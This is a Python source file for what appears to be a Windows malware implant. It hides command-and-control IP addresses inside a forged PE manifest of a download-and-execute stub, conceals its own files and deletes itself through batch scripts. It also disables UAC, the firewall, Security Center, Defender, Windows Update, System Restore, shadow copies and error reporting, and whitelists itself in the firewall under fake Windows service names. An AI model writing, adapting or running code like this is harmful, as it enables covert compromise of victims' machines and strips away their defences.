import os
import sys
import time
import stat
import string
import hashlib
import urllib2
import subprocess
import base64
import binascii
import win32con
import win32api
import socket
import tempfile
import win32com.shell.shell as win32shell
import win32event, win32api, winerror
from shutil import copyfile
from xml.dom.minidom import parseString

from config import *
from tqdm import tqdm
from binaries import DREAMR_B64
from binaries import MT_B64

# Console Debug Logs #
def debug(tag, msg):
	if (DEBUG_MODE):
		print("%s: %s" % (tag, msg))

# Send commands to the system shell in a list, executes them one
# by one, and collect the result
def executeAndCollect(program, arglist, shell):
	cmd = [ program ]
	for arg in arglist:
		cmd.append(arg)
	handle = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE)
	(stdout, stderr) = handle.communicate()
	exitCode = handle.wait()
	if (stderr):
		debug("core", "execute error -> %s" % stderr)
	return stdout

# Shira file attribs set
def hideFile(file):
	# (S)ystem, (H)idden, Not-(I)ndexed, (R)ead-only, 
	ShiraAttribs = win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM | win32con.FILE_ATTRIBUTE_READONLY | win32con.FILE_ATTRIBUTE_NOT_CONTENT_INDEXED

	try:
		win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_HIDDEN)
		win32api.SetFileAttributes(file, ShiraAttribs)
	except Exception as e:
		debug("core", "fail set shira permissions on file -> %s" % str(e))

# Shira file attribs unset
def unhideFile(file):
	# Set the file attributes back to their defaults
	ShiraAttribs = win32con.FILE_ATTRIBUTE_NORMAL

	try:
		win32api.SetFileAttributes(file, ShiraAttribs)
	except:
		debug("core", "fail set normal permissions on file")

# Generates an encoded download and execute stub. The primary Python implant
# will download this one. It bootstraps by looking at the PE manifest public key section
def generateStub(hostlist):
	if (len(hostlist) > 0):
		# Now make the enocded hostlist string (Ex: )
		result = []
		print(hostlist)
		for host in hostlist:
			try:
				debug("core", "add %s to stub" % host)
				try:
					result.append(binascii.hexlify(socket.inet_aton(host)))
				except:
					debug("core", "error encode address -> %s" % str(e))
			except Exception as e:
				debug("core", "invalid host address -> %s" % str(e))

		if len(result) != 0:
			hostlistString = str.join("-", result)
			debug("core", "embed hostlist string")
			debug("core", "'publicKey' -> %s" % hostlistString)
			embedHostListManifest(hostlistString)
		else:
			debug("core", "nothing to encode")
	else:
		debug("core", "hostlist empty nothing to encode")

# Generate a hostlist manifest (using mt.exe)
def embedHostListManifest(hostlistString):
	debug("core", "begin stub generate")
	try:
		dreamrBytes = base64.b64decode(DREAMR_B64)
		with open("%sdreamr.exe" % WebPath, "wb") as handle:
			handle.write(dreamrBytes)
	except Exception as e:
		debug("core", "write bin fail -> %s" % str(e))

	# Write MT tool to disk
	mtBytes = base64.b64decode(MT_B64)
	with open("%smt.exe" % WebPath, "wb") as handle: # exec skipped on write fail, write fail on bin already running
		handle.write(mtBytes)

	# Generate a manifest and write it to the disk
	encodedManifest = generateHostListManifest(hostlistString)
	with open("%sdrmr.manifest" % WebPath, "w") as handle:
		handle.write(encodedManifest)

	# Execute
	os.chdir(WebPath)
	execute("mt.exe", ("-manifest", "drmr.manifest", "-outputresource:dreamr.exe;1"), False)

	time.sleep(1)

	# Write the rest of the stub
	dreamrBytes = base64.b64decode(DREAMR_B64)
	if os.path.isfile(filename):
		fileSize = os.path.getsize(filename)
		if fileSize >= LOADR_SIZE and fileSize < 50000:
			debug("core", "write more stub")
			with open("%sdreamr.exe" % WebPath, "a+b") as handle:
				handle.write(dreamrBytes[LOADR_SIZE:])
			try:
				os.remove("%smt.exe" % WebPath)
				os.remove("%sdrmr.manifest" % WebPath)
			except:
				pass
		else:
			os.remove("%smt.exe" % WebPath)
	
# Dumps the hostlist manifest from a binary (using mt.exe)
def extractHostListManifest(stubLocation):
	if os.path.isfile(stubLocation):
		try:
			# Copy stub to temp direftory
			tempdir = tempfile.gettempdir()
			os.chdir(tempdir)
			copyfile(stubLocation, "dreamr.exe")

			# Write MT tool to disk
			mtBytes = base64.b64decode(MT_B64)
			with open("mt.exe", "wb") as handle: # exec skipped on write fail, write fail on bin already running
				handle.write(mtBytes)

			# Change into temp dir and extract the manifest
			os.chdir(tempdir)
			execute("mt.exe", ("-inputresource:dreamr.exe;1", "-out:dreamr.txt"), False)
			with open("dreamr.txt", "r") as handle:
				return handle.read()
		except Exception as e:
			debug("core", "error extract manifest -> %s" % str(e))

# Generates a hsotlist encoded manifest
def generateHostListManifest(hostlistString):
	return '''\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"> 
	  <application> 
		<!--This Id value indicates the application supports Windows Vista functionality -->
		  <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"/> 
		<!--This Id value indicates the application supports Windows 7 functionality-->
		  <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/>
		<!--This Id value indicates the application supports Windows 8 functionality-->
		  <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/>
		<!--This Id value indicates the application supports Windows 8.1 functionality-->
		  <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
	  </application> 
  </compatibility>
  <assemblyIdentity type="win32" 
					name="myOrganization.myDivision.mySampleApp" 
					version="6.0.0.0" 
					processorArchitecture="x86" 
					publicKeyToken="%s"
  />
  <dependency>
	<dependentAssembly>
		<assemblyIdentity
			type="win32"
			name="Microsoft.Windows.Common-Controls"
			version="6.0.0.0"
			processorArchitecture="*"
			publicKeyToken="26822b64123ccffda"
			language="*"
		/>
	</dependentAssembly>
  </dependency>
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
	<windowsSettings>
		<dpiAware  xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
	</windowsSettings>
  </application>  
</assembly>
''' % (hostlistString)

def decodeHostlistManifest(manifest):
	packedHosts = []

	# Parse XML until we find the "public key"
	dom = parseString(manifest)
	assemblyIdentity = dom.getElementsByTagName("assemblyIdentity")
	for el in assemblyIdentity:
		if el.attributes['publicKeyToken'].value:
			packedHosts = str.split(str(el.attributes['publicKeyToken'].value), "-")
			break

	# Test each host
	if (packedHosts):
		hostlist = []
		for packedHost in packedHosts:
			try:
				hostlist.append(socket.inet_ntoa(binascii.unhexlify(packedHost)))
			except Exception as e:
				print("corrupted hostlist -> %s" % str(e))
	return hostlist

# execute and forget
def execute(program, arglist, shell):
	cmd = [ program ]
	for arg in arglist:
		cmd.append(arg)
	try:
		handle = subprocess.Popen(cmd, shell=shell, stdout=subprocess.PIPE)
	except Exception as e:
		debug("core", "failed to execute file -> %s" % str(e))
	return

# Download the package
def downloadFile(url, filename, sha1sum):
	try:
		debug("core", "download file http")
		web = urllib2.urlopen(url)
		meta = web.info()
		totalSize = long(meta.getheaders("Content-Length")[0])
		block = 8192

		# Download the file from the remote server
		print "Fetch: %s (%sB)" % (filename, totalSize)
		try:
			with open(filename, "wb") as fhandle:
				currentSize = 0
				fhandle.write(web.read())
		except Exception as e:
			debug("core", "failed download file -> %s" % str(e))
			pass

		# Check file integrity
		checksum = hashlib.sha1(open(filename, "rb").read()).hexdigest()
		if (checksum == sha1sum):
			print("%s => VALID" % filename)
			return True
	except Exception as e:
		debug("core", "download fail -> %s" % str(e))
	return False

# Have we seen this string before? 
def checkUnique(selector):
	result = True
	try:
		# Make the file header if not exists file
		if (not os.path.isfile("s.db")):
			try:
				handle = open("s.db", "a")
				handle.write("%s\n" % BinaryLocation)
				handle.close()
				os.system("attrib -H s.db")
				debug("core", "write s.db")
			except:
				debug("core", "except write unique header")

		# See if the selector is already on the list
		try:
			handle = open("s.db", "r")
			ln = 0
			for line in handle:
				# Not unique because line is the same as the selector
				if (line == selector):
					result = False
				ln += 1
			handle.close()
		except:
			debug("core", "can't read s.db")

		# Write the selector at the bottom of the file
		if (result):
			try:
				handle = open("s.db", "a")
				handle.write("%s\n" % selector)
				handle.close()
			except:
				debug("core", "except write not unique")
	except:
		debug("core", "except check unique")

	# Return true
	result = True
	return result

# Melt Implant
def melt(filename = BinaryLocation):
	# Try and make the dreamr danger mutex to warn other implants
	try:
		mutex = win32event.CreateMutex(None, True, "dreamcatchr-melting")
	except:
		pass
	try:
		things = [WebPath, BinaryLocation, DreamrLocation, sys.argv[0], KeyPath]
		for thing in things:
			unhideFile(filename)
			#execute("attrib", ["-R", "-A", "-S", "-H", filename], False)
	except:
		pass
	try:
		execute("rd", ["/S", "/Q", KeyPath], False)
		execute("rd", ["/S", "/Q", WebPath], False)
	except:
		try:
			execute("rd", ["/S", "/Q", WebPath], False)
			execute("rd", ["/S", "/Q", KeyPath], False)
		except:
			pass

	countdown = 3
	while countdown > 0:
		countdown -= 1
		debug("core", "the implant will melt in %s seconds" % countdown)
		time.sleep(1)

	batchName = "mlt.bat"
	batch = open(batchName, "w")
	batch.write("@echo off\n")
	batch.write("ping 127.0.0.1 -n 2\n")
	batch.write("del dreamr.exe\n")
	batch.write("rd /S /Q www\n")
	batch.write("rd /S /Q cert\n")
	batch.write("del \"%s\"\n" % filename)
	batch.write("del \"%s\"\n" % sys.argv[0])
	batch.write("del \"%s\"\n" % batchName)
	batch.close()
	subprocess.Popen([batchName])
	return

# Update Implant
def update(updateLocation):
		debug("core", "Preparing to update")
		try:
			unhideFile(BinaryLocation)
			#execute("attrib", ["-R", "-A", "-S", "-H", BinaryLocation], False)
		except:
			pass

		# Countdown until update
		countdown = 60
		while countdown > 0:
			countdown -= 1
			debug("updater", "updating in %s seconds" % countdown)
			time.sleep(1)
		# you can't see me count down, but I do.

		# Melt Update
		debug("core", "write_update_batch")
		batchName = "upd.bat"
		batch = open(batchName, "w")
		batch.write("@echo off\n")
		batch.write("ping 127.0.0.1 -n 2\n")
		batch.write("move /Y \"%s\" \"%s\"\n" % (updateLocation, BinaryLocation))
		batch.write("start \"\" \"%s\"\n" % BinaryLocation)
		#batch.write("shutdown /r /t 1 /f\n")
		batch.write("del \"%s\"\n" % batchName)
		batch.close()
		subprocess.Popen([batchName])
		return

# Nope
def byeUAC():
	execute("reg", ("add", "HKLM\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f"), False)

# Keep hidden file setting toggled off
def byeHiddenFiles():
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoFolderOptions", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	#execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "/v", "NoViewContextMenu", "/t", "REG_DWORD", "/d", "0", "/f"), False) <- not very nice

# Firewall FTL
def byeFirewall():
	execute("netsh", ("firewall", "add", "allowedprogram", DreamrLocation, "Windows Networking Service", "ENABLE"), False)
	execute("netsh", ("firewall", "add", "allowedprogram", BinaryLocation, "Digital Rights Management Support Subsystem", "ENABLE"), False)
	execute("netsh", ("firewall", "add", "allowedprogram", sys.argv[0], "Digital Rights Management", "ENABLE"), False)
	execute("netsh", ("firewall", "set", "opmode", "disable"), False)

def byeNotify():
	execute("reg", ("add", "HKCU\\SOFTWARE\\Microsoft\\Security Center", "/v", "FirewallDisableNotify", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\SOFTWARE\\Microsoft\\Security Center", "/v", "FirewallDisableNotify", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\wscsvc", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("sc", ("stop", "wscsvc"), False)
	time.sleep(1)
	execute("sc", ("delete", "wscsvc"), False)

def byeErrorReporting():
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "DontSendAdditionalData", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "LoggingDisabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("reg", ("add", "HKLM\\Software\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f"), False)

# VSS Disable (Admin)
def byeShadowing():
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\vss", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("sc", ("stop", "srservice"), False)

# System Restore Disable
def byeSystemRestore():
	execute("reg", ("add", "HKLM\\System\\CurrentControlSet\\Services\\srservice", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "/v", "DisableSR", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("sc", ("stop", "srservice"), False)

# Windows Update Disable
def byeWindowsUpdate():
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "/v", "NoAutoUpdate", "/t", "REG_DWORD", "/d", "1", "/f"), False)
	execute("sc", ("stop", "Windows Update"), False)

# Windows Defender/Sample Submission Disable
def byeDefender():
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"), False)

# Windows Binary Tracking Disable
def byeTelemetry():
	execute("reg", ("add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "/v", "Start", "/t", "REG_DWORD", "/d", "4", "/f"), False)
	execute("reg", ("add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection", "/v", "AllowTelemetry", "/t", "REG_DWORD", "/d", "0", "/f"), False)
	execute("sc", ("delete", "DiagTrack"), False)
	execute("sc", ("delete", "dmwappushservice"), False)

# print downloadFile("https://nmap.org/dist/nmap-7.12-setup.exe", "nmap.exe", "aadd08bf4ff8d1350ee752c6c39d60bbea6939ac")
# generateStub(["10.1.1.200", "10.1.1.201"])
# time.sleep(2)
# print decodeHostlistManifest(extractHostListManifest("%sdreamr.exe" % WebPath))